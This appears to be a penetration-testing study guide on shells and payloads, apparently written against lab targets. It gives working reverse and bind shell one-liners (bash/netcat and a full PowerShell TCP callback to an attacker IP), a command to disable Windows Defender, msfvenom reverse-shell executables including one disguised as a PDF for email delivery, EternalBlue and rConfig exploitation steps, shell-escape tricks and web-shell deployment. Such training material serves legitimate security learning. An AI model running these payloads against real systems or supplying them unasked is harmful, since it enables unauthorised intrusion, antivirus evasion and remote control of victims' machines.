 # Introduction
### Shell Overview for Penetration Testing

A **shell** provides a command-line interface (CLI) to interact with the system (e.g., Bash, cmd, PowerShell). For penetration testers, getting a shell often means successfully exploiting a vulnerability to gain remote access and control over a target machine.

### Why Get a Shell?
- **Direct OS Access**: Run system commands, explore the file system, and escalate privileges.
- **Persistence**: Keep access to work longer, transfer files, and exfiltrate data.
- **Low Detection**: Shells are harder to detect than graphical access (e.g., RDP, VNC), and faster for OS navigation and automation.

### Types of Shells:
- **Standard Shells**: Gained by exploiting vulnerabilities (e.g., EternalBlue to access cmd on Windows).
- **Web Shells**: Exploit web vulnerabilities (e.g., file upload) and use a browser to issue commands.

### Payloads Deliver Shells
- **Payload**: Code designed to exploit a system vulnerability, often leading to remote shell access.

# Shell Basics

## Anatomy of a Shell
Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. 

### Command Language Interpreters:
- A **command language interpreter** translates user commands into actions the operating system can execute.
- It's part of the **command-line interface (CLI)**, which includes:
  1. **Operating system**: The core system managing the computer.
  2. **Terminal emulator**: The window or app where you type commands (e.g., Terminal, Command Prompt).
  3. **Interpreter**: The translator that processes commands (e.g., Bash, PowerShell, cmd).
  
- **Command language interpreters** can also be called **shell scripting languages** or **Command and Scripting interpreters**.
- These interpreters allow users to run commands and scripts to manage systems or exploit vulnerabilities.
- Understanding which interpreter is in use helps choose the correct commands and scripts.

### MITRE ATT&CK Matrix:
- The **MITRE ATT&CK Matrix** is a framework listing techniques used by attackers to exploit systems.
- **Execution techniques** describe methods attackers use to run malicious code, including through command interpreters.
  
- Knowledge of command language interpreters and execution techniques is useful for gaining control over vulnerable systems (e.g., getting a shell session).

### Example in Parrot OS
When we opened the MATE terminal, it used a command language interpreter, indicated by the $ prompt, common in Bash, Ksh, and POSIX shells. When typing a random command and hitting enter, Bash responded that it didn't recognize the command, showing that interpreters have their own set of recognized commands. Another way to identify the interpreter is by viewing running processes in Linux using a command like ps.(open green for bash and blue for powershell on the top right corner)

__Shell Validation From 'ps'__
```
ps
```
__Shell Validation Using 'env'__
```
env
```

## Bind Shells
we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a Bind shell or reverse shell
![image](https://github.com/user-attachments/assets/a238083c-1244-447c-9a1b-dd5f8ead06f0)

### Challenges in Getting a Shell:

1. **Listener Needed**: There must be a listener running on the target.
2. **Starting a Listener**: If no listener is active, you need to start one.
3. **Firewall and NAT/PAT**: 
   - Strict incoming firewall rules and NAT/PAT on the network edge can block external connections.
   - You typically need to be on the internal network to bypass these rules.
4. **OS Firewalls**: 
   - Windows and Linux firewalls often block incoming connections not associated with trusted applications.

### Example bind shell implementation 
Netcat (nc) is considered our Swiss-Army Knife since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. 

__No. 1: Server - Target starting Netcat listener__
```
Target@server:~$ nc -lvnp 7777
```
__No. 2: Client - Attack box connecting to target__
```
nc -nv 10.129.41.200 7777
```
once connected you will see succeeded output on attackbox and connection recieved on target. you can send messages by simply typing into the attack box terminal. We still havent got shell its just a tcp connection.

### Establishing a Basic Bind Shell with Netcat
we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

__No. 1: Server - Binding a Bash shell to the TCP session__
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
this is a payload.

__No. 2: Client - Connecting to bind shell on target__
```
nc -nv 10.129.41.200 7777
```
you will notice $ means shell. The exercises helped us understand how a bind shell works without security controls like NAT, firewalls, IDS/IPS, or authentication mechanisms (unrealistic scenario).

## Reverse Shell
With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
![image](https://github.com/user-attachments/assets/c8dd1422-d61d-491f-aa91-5defd91c644a)

To establish a reverse shell on a vulnerable system, we rely on outbound connections, as these are often overlooked by admins, increasing the chances of going undetected. Unlike bind shells, which require incoming connections through the firewall on the target side, reverse shells initiate a connection from the target to the attacker's system, with the attacker setting up a listener. Techniques like Unrestricted File Upload or Command Injection can trigger this connection. For payloads, we can use resources like the [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#socat), which provides pre-built commands and tools. However, it's important to customize attacks since security teams may anticipate commonly used payloads from public repositories.

### Reverse Shell example
__Server (attack box)__ 
```
sudo nc -lvnp 443
```
Port 443 outbound is rarely blocked this usually for HTTPS. Stronger firewall will detect during layer 7 packet detection and may block connection.

__Client (target windows)__
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

This PowerShell code can also be called shell code or our payload. 

an error might occur if windows defender antivirus is active.  For our purposes, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):

__Disable AV__
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
Back on our attack box, we should notice that we successfully established a reverse shell.

# Payloads

## Introduction
 In information security, it refers to the command or code that exploits a vulnerability in an OS or application, performing a malicious action. For example, as seen in the reverse shells section, Windows Defender blocked the PowerShell payload due to its malicious nature. When delivering and executing payloads, it's essential to understand that we're simply giving the target system instructions, much like any program. Instead of seeing it as mysterious "malicious code," it's important to explore and understand what the payload is actually doing.
 
### Netcat/Bash Reverse Shell One-liner linux

This Netcat/Bash reverse shell one-liner creates a backdoor connection from a target machine to an attacker:

1. **Remove File**: `rm -f /tmp/f;` removes any existing file `/tmp/f`. The `-f` flag ensures no error if the file doesn't exist.
2. **Create Pipe**: `mkfifo /tmp/f;` makes a special file (named pipe) at `/tmp/f`, which allows data to flow in and out like a channel.
3. **Read Input**: `cat /tmp/f |` reads data from the pipe and sends it to the next command using a pipe (`|`).
4. **Start Shell**: `/bin/bash -i 2>&1 |` starts an interactive Bash shell and redirects errors and output to the next command.
5. **Netcat Connection**: `nc 10.10.14.12 7777 > /tmp/f` connects to the attacker's machine (`10.10.14.12`) on port `7777`, sending the shell's output back through the pipe.

### PowerShell One-liner payload
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
**powershell -nop -c** Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in **cmd.exe**.

1. Establish a Connection: ` $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);` Creates a TCP client that connects to the attacker's machine at IP 10.10.14.158 on port 443.
2. Get the Network Stream: `$stream = $client.GetStream();` Retrieves the data stream (input/output) from the TCP connection.
3. Create a Buffer: `[byte[]]$bytes = 0..65535 | % { 0 };` Creates a byte array buffer to store the incoming and outgoing data.
4. Read Incoming Commands: `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` This loop reads data (commands) sent by the attacker from the TCP stream.
5. Execute Received Commands: `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );` Converts the incoming bytes into a string (the command), then executes the command using iex.
2>&1 captures both errors and output, and Out-String formats it.
6. Send Command Output Back to Attacker: `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
` Prepares the command output and sends it back to the attacker.
Includes a PowerShell prompt (PS) showing the current directory.
7. Repeat Until Connection Closes: `$stream.Flush();` Ensures the buffer is fully sent before waiting for the next command.
8. Close the Connection: `$client.Close();` Closes the TCP connection when finished.

## Automating Payloads & Delivery with Metasploit

Metasploit, developed by Rapid7, is an automated attack framework that simplifies exploiting vulnerabilities using pre-built modules to deliver payloads and gain system access. It's widely used in cybersecurity, though some training environments limit its use due to how easy it makes exploitation.

__Starting MSF__ 
```
sudo msfconsole
```

In this case, we will be using enumeration results from a nmap scan to pick a Metasploit module to use.
__NMAP Scan__ 
```
nmap -sC -sV -Pn 10.129.164.25
```
In the output, we see several standard ports that are typically open on a Windows system by default. Remember that scanning and enumeration is an excellent way to know what OS (Windows or Linux) our target is running to find an appropriate module to run with Metasploit.
__Searching Within Metasploit__
```
search smb
```

We will see a long list of Matching Modules associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a Name, Disclosure Date, Rank, Check and Description.
![image](https://github.com/user-attachments/assets/9a573134-4b3f-4845-a408-2c627cdf985e)

__Option Selection__
```
use 56
```
__Examining an Exploit's Options__ 
```
options
```

__Setting Options__ 
```
set RHOSTS 10.129.180.71
```
These settings will ensure that our payload is delivered to the proper target (RHOSTS), uploaded to the default administrative share (ADMIN$) utilizing credentials (SMBPass & SMBUser), then initiate a reverse shell connection with our local host machine (LHOST).
__Exploit Execution__
```
exploit
```
After we issue the exploit command, the exploit is run, and there is an attempt to deliver the payload onto the target utilizing the Meterpreter payload. Metasploit reports back each step of this process, as seen in the output. We know this was successful because a stage was sent successfully, which established a Meterpreter shell session (meterpreter >) and a system-level shell session. 

 use the shell command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.

 __Interactive shell__
```
shell
```
## Crafting Payloads with MSFvenom
To run an exploit, deliver the payload, and establish a shell, we need network communication with the target. This might be through an internal network or a route into the target's network. However, if direct access isn't possible, we can use creative methods like MSFvenom to craft a payload and deliver it via email or social engineering, tricking the user into executing it.
MSFvenom also allows us to encrypt & encode payloads to bypass common anti-virus

__List Payloads__ 
```
msfvenom -l payloads
```
### Staged vs. Stageless Payloads

**Staged Payloads**: Staged payloads send a small initial stage that sets up the target and then downloads the rest of the payload over the network. For example, the linux/x86/shell/reverse_tcp payload works this way. The small stage contacts the attack box to fetch the full payload and establish a reverse shell. You need to configure IPs and ports for the listener to catch the shell. Keep in mind, staged payloads use memory for the stage, leaving less for the payload itself. They might be less suitable for environments with limited bandwidth.

**Stageless Payloads**: Stageless payloads send the entire payload in one go, without an initial stage. For example, linux/zarch/meterpreter_reverse_tcp is a stageless payload. This can be advantageous in low-bandwidth environments where staged payloads might be unstable. Stageless payloads also tend to be better for evasion as they generate less network traffic.

__Differentiate between staged and stageless__
The name will give you your first marker. Take our examples from above, linux/x86/shell/reverse_tcp is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So /shell/ is a stage to send, and /reverse_tcp is another.  It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function /meterpreter_reverse_tcp. 

__Building A Stageless Payload (Linux)__
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
-p is creating payload. LHOST, LPORT is Address To Connect Back To host. -f flag specifies the format the generated binary will be in. 

__Executing a Stageless Payload__
Getting the Payload to the Target System
Once the payload is created, it needs to be delivered to the target system. Common methods include:

- **Email**: Attach the payload file to an email message.
- **Download Link**: Provide a link on a website for the user to download the payload.
- **Metasploit Exploit Module**: Use this method if you already have internal network access.
- **Flash Drive**: Physically deliver the payload during an onsite penetration test.

After the payload is on the target system, it must be executed.

For the payload to be successfull we need a listener as well.

__NC Listener Connection__
```
sudo nc -lvnp 443
```
__Building A Stageless Payload (Windows)__
```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
here we choose .exe

# Infiltrating Windows

## Prominent Windows Exploits
![image](https://github.com/user-attachments/assets/b202e405-6dd2-4a75-8d99-4cc96536fe2b)
With these vulnerabilities in mind, Windows isn't going anywhere. We need to be proficient with identifying vulnerabilities, exploiting them, and moving around in Windows hosts and environments. An understanding of these concepts can help us secure our environments from attack as well. 

## Enumerating Windows & Fingerprinting Methods
To quickly check if a host is likely a Windows machine, look at the Time To Live (TTL) value in ICMP responses. Windows typically responds with a TTL of 128, though sometimes 32. TTL values may vary if you're not on the same network layer. Most hosts are less than 20 hops away, so TTL rarely drops enough to match other OS types. A TTL of 128 in a ping response is a good indicator of a Windows system.

```
ping 192.168.86.39
```
Another way we can validate if the host is Windows or not is to use our handy tool, NMAP. 

__Os Detection Scan__
```
sudo nmap -v -O 192.168.86.39
```
example, we will utilize the -O option with verbose output -v to initialize an OS Identification scan against our target $Target. If you run into issues and the scans turn up little results, attempt again with the -A and -Pn options. This will perform a different scan and may work.

To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called banner.nse. 

__Banner Grab to Enumerate Ports__ 
```
sudo nmap -v 192.168.86.39 --script banner.nse
```
## Bats, DLLs, & MSI Files, Oh My!

### Payload Types for Windows Hosts

When creating payloads for Windows hosts, common options include DLLs, batch files, MSI packages, and PowerShell scripts. Each file type offers different capabilities, but all are executable on the host. Choose the type based on your delivery method.

- **DLLs**: Dynamic Linking Libraries used by many programs. Malicious DLLs can elevate privileges or bypass User Account Controls (UAC).
- **Batch Files**: Text-based scripts (.bat) used to automate commands, such as opening ports or sending info back to an attacker.
- **VBS**: is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
- **MSI**: Installation files used by Windows Installer. Payloads can be crafted as .msi files, run with `msiexec` to gain access.
- **PowerShell**: A powerful shell and scripting language. It can execute payloads, gain a shell, and perform various penetration testing tasks.

These file types provide flexibility in crafting and delivering payloads to compromise a Windows system.

## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

### Payload Generation Options for Windows Hosts

Here are some useful tools for generating payloads against Windows systems:

- **MSFVenom & Metasploit Framework**: 
  - A versatile tool for generating payloads, enumerating hosts, using exploits, and performing post-exploitation. Acts as a swiss-army knife for pentesters.
  
- **Payloads All The Things**: 
  - A resource with cheat sheets and guides for payload generation and overall methodology.
  
- **Mythic C2 Framework**: 
  - An alternative to Metasploit, serving as a Command and Control (C2) framework with unique payload generation tools.
  
- **Nishang**: 
  - A collection of offensive PowerShell scripts and implants useful for pentesters.
  
- **Darkarmour**: 
  - A tool for generating obfuscated binaries to bypass detection on Windows hosts.

### Payload Transfer and Execution Options

Here are tools and methods for delivering and executing payloads on Windows hosts:

- **Impacket**: 
  - A Python toolset for interacting with network protocols. Key tools include `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to create an SMB server.
  
- **Payloads All The Things**: 
  - A great resource for file transfer oneliners and quick methods to move files between hosts.

- **SMB**: 
  - Useful for transferring files between domain-joined hosts with shared drives. Attackers can exploit C$ and admin$ shares for payload transfer or data exfiltration.

- **Remote execution via MSF**: 
  - Metasploit modules can automatically build, stage, and execute payloads on remote hosts.

- **Other Protocols**: 
  - Protocols like FTP, TFTP, HTTP/S can be used for file transfers. Always enumerate open services and see what's available for use.

## Example Compromise Walkthrough

### 1. **Enumeration of the Host**
- Use tools like Ping, Netcat, Nmap, or Metasploit for host enumeration.
- **Nmap Scan Command**: `nmap -v -A 10.129.201.97`
  - Open Ports: 135 (msrpc), 80 (http), 139 (netbios-ssn), 445 (microsoft-ds).
  - Host OS: Windows Server 2016 Standard 6.3.
  - IIS service running on port 80; SMB open on ports 139/445.
  
### 2. **Determine Exploit Path**
- **Potential exploits**: IIS vulnerabilities, SMB exploits, or Remote Code Execution (RCE).
- **MS17-010 (EternalBlue)**: Windows Server 2016 is vulnerable. Validate using the `auxiliary/scanner/smb/smb_ms17_010` module in Metasploit.

### 3. **Validate Vulnerability (MS17-010)**
- Open `msfconsole`, use the auxiliary scanner for MS17-010.
  - Command: `use auxiliary/scanner/smb/smb_ms17_010`
  - Set RHOSTS to target IP: `set RHOSTS 10.129.201.97`
  - Run the module: `run`
  - Result: Host is likely vulnerable to MS17-010.

### 4. **Select Exploit & Payload**
- Search for EternalBlue exploit: `search eternal`
  - Choose `exploit/windows/smb/ms17_010_psexec`.
  - Default payload: `windows/meterpreter/reverse_tcp`.
- Set necessary options: 
  - `set RHOSTS 10.129.201.97`
  - `set LHOST <your IP>`
  - `set LPORT 4444`

### 5. **Execute Exploit**
- Run the exploit: `exploit`
  - Successful: Gained **NT AUTHORITY\SYSTEM** shell with Meterpreter.
  
### 6. **Interact with Meterpreter Shell**
- Use Meterpreter for post-exploitation actions.
  - Command: `getuid` (to check current user).
  - Drop into a native system shell using: `shell`
  - Identify the shell type (CMD vs. PowerShell) by the prompt.
  
  - CMD shell: `C:\Windows\system32>`
  - PowerShell shell: `PS C:\Windows\system32>`
  
### 7. **Summary**
- Successfully exploited Windows Server 2016 using EternalBlue.
- Gained a SYSTEM level shell and can run further commands to gather information or escalate further.

## CMD-Prompt and PowerShell

### When to Use CMD

- **Older Hosts**: Use CMD if the target host doesn't have PowerShell installed.
- **Simple Interactions**: Ideal for basic tasks and commands.
- **Batch Files/Net Commands**: Best when executing batch scripts, `net` commands, or MS-DOS native tools.
- **Execution Policies**: If PowerShell execution policies might prevent certain scripts or actions, CMD is a safer option.

### When to Use PowerShell

- **Cmdlets/Custom Scripts**: PowerShell is ideal when you need to run cmdlets or custom-built scripts.
- **.NET Interactions**: Use PowerShell when you want to work with .NET objects instead of simple text output.
- **Cloud Services**: Best when interacting with cloud-based services or hosts.
- **Aliases**: Use PowerShell if your scripts rely on Aliases for execution.

## WSL and PowerShell For Linux

Windows Subsystem for Linux (WSL) is a feature in Windows that lets you run a full Linux environment directly on your Windows machine without needing to use a virtual machine (VM) or dual boot. It allows developers and system administrators to use Linux tools and commands side by side with Windows programs. 

# Infiltrating Unix\Linux

### 1. Initial Host Enumeration:
- **Command**: `nmap -sC -sV 10.129.201.101`
- **Purpose**: Discover open ports, services, and software versions.
- **Findings**:
  - FTP (`vsftpd 2.0.8+`) on port 21.
  - SSH (`OpenSSH 7.4`) on port 22.
  - Apache HTTPD (`2.4.6` on CentOS) with OpenSSL and PHP 7.2.34 on ports 80 and 443.
  - MySQL on port 3306.
  - RPCBind on port 111.
- **Action**: This suggests a web server with multiple services. Focus on HTTP (Apache) and FTP for potential vulnerabilities, as these services may allow remote code execution (RCE).

### 2. Vulnerability Research:
- **Focus on rConfig 3.9.6** (found during web application discovery).
- **Approach**: Research CVEs or exploits using keywords: “rConfig 3.9.6 vulnerability.”
- **Common Findings**: Multiple RCE vulnerabilities exist for rConfig, including file upload vulnerabilities.

### 3. Metasploit Exploit Search:
- **Command**: `msf6 > search rconfig`
- **Results**: Found multiple rConfig-related modules.
  - `exploit/linux/http/rconfig_vendors_auth_file_upload_rce`: An exploit allowing RCE via a vulnerable file upload mechanism in rConfig.

### 4. Loading and Running the Exploit:
- **Command**: `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`
- **Setup**:
  - Set target IP, reverse shell listener IP, and port.
  - Check if the target is vulnerable (`rConfig 3.9.6` is vulnerable).
- **Execute**:
```
  msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
```
 
Uploads a malicious PHP payload to the rConfig web interface.
Executes the payload to establish a reverse shell to the attacker.
### 5. Gaining a Meterpreter Shell:
Successful exploitation opens a Meterpreter shell:

Commands:
shell: Drops into a system-level shell.
dir or ls: Explore the filesystem of the target.

### 6. Handling Non-TTY Shells:   
 After gaining a shell, you may find it’s a non-tty shell, limiting functionality (e.g., can’t use sudo or su).

 Solution: Spawn a full TTY shell using Python (if installed):
 ```
python -c 'import pty; pty.spawn("/bin/sh")'
```
### 7. Post-Exploitation:
Objective: Privilege escalation or lateral movement to other systems.

**whoami**: To verify which user the shell session is running as (e.g., apache).
Explore the system further, looking for sensitive files, credentials, or ways to escalate privileges.

## Spawning Interactive Shells

After gaining a shell, we used Python to spawn a full TTY shell for better command access. This scenario is common in practice and real-world engagements, especially with limited or jail shells. If Python isn't available, there are other ways to spawn an interactive shell. It's important to know that /bin/sh or /bin/bash can often be replaced with any shell binary present on the system, with most Linux systems having bourne shell (/bin/sh) or bourne again shell (/bin/bash).
### /bin/sh -i
This command will execute the shell interpreter specified in the path in interactive mode (-i).

### Perl (programming language)
```
perl —e 'exec "/bin/sh";'
```
```
perl: exec "/bin/sh";
```
### Ruby
```
ruby: exec "/bin/sh"
```
### Lua
If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:
```
lua: os.execute('/bin/sh')
```
### AWK
AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems
```
awk 'BEGIN {system("/bin/sh")}'
```
### Find
```
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
```
This use of the find command is searching for any file listed after the -name option, then it executes awk (/bin/awk) and runs the same script we discussed in the awk section to execute a shell interpreter.
### Using Exec To Launch A Shell
```
find . -exec /bin/sh \; -quit
```
This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
### VIM
vim to shell
```
vim -c ':!/bin/sh'
```
vim to escape
```
vim
:set shell=/bin/sh
:shell
```
### Execution Permissions Considerations
list files with permissions to know the permissions of the current shell sessions account.
```
ls -la <path/to/fileorbinary>
```
or
```
Sudo -l
```
The sudo -l command above will need a stable interactive shell to run. 
# Web shells
A web shell is a browser-based shell session we can use to interact with the underlying operating system of a web server. Again, to gain remote code execution via web shell, we must first find a website or web application vulnerability that can give us file upload capabilities. Most web shells are gained by uploading a payload written in a web language on the target server. The payload(s) we upload should give us remote code execution capability within the browser. 

## Laudanum, One Webshell to Rule Them All
Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more.

The Laudanum files are located in the /usr/share/laudanum directory. Most files can be copied as-is to the target. For shells, edit the file to insert your attacking host IP address to access the web shell or receive a reverse shell callback.

Make sure to add the ip and the url( <target ip> status.inlanefreight.local) in the etc/hosts file.
### Move a Copy for Modification
```
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```
Add your IP address to the allowedIps variable on line 59. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV.
![image](https://github.com/user-attachments/assets/5e36fef5-d0ee-4c31-a8d3-c33b87cd5c26)

Upload the file on an upload function. you will see output of the directory where our shell file was uploaded. Visit the url by changing the \ to / character.

![image](https://github.com/user-attachments/assets/de27a6f9-984e-48cb-aace-f47e5a706879)

we can issue commands here.

## Antak Webshell

### ASPX [Additional info](https://ippsec.rocks/?#)
ASPX is a file type used in Microsoft's ASP.NET Framework to create web forms for user input. On the server, it processes this input and generates HTML. However, ASPX can be exploited to upload malicious tools, like the Antak Webshell, allowing attackers to control the underlying Windows operating system.
### Antak Webshell

Antak is a web shell built-in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. 

__Antak location__
```
ls /usr/share/nishang/Antak-WebShell
```
__Move a Copy for Modification__
```
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```
Make sure you modify the file and change password and text. Upload the file and visit the url.  you will get alert to enter text and password enter the same one as the one u modified before.

With access via the Antak Webshell, we can execute PowerShell commands to navigate and perform actions on the host. This includes uploading and downloading files, executing scripts, and more. We can deliver a callback to our command and control platform by using the Upload function or a PowerShell one-liner to download and run the shell. If you're unsure where to start, use the help command in the prompt window.
